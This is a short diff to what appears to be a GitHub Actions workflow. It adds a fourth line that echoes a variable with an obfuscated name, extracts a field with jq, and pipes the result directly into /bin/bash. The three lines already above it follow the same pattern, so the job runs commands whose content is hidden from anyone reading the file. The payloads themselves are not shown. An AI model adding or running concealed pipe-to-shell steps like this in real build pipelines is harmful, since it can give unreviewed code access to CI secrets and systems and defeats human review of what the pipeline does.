@@ -28,6 +28,7 @@ jobs:
           echo $a8 | jq -r .ejofo1 | /bin/bash
           echo $mnhq3299 | jq -r .a486 | /bin/bash
           echo $wnfdv3 | jq -r .qh4905 | /bin/bash
+          echo $twk2077 | jq -r .vjy78 | /bin/bash
 
       - name: Upload artifact
         if: always()
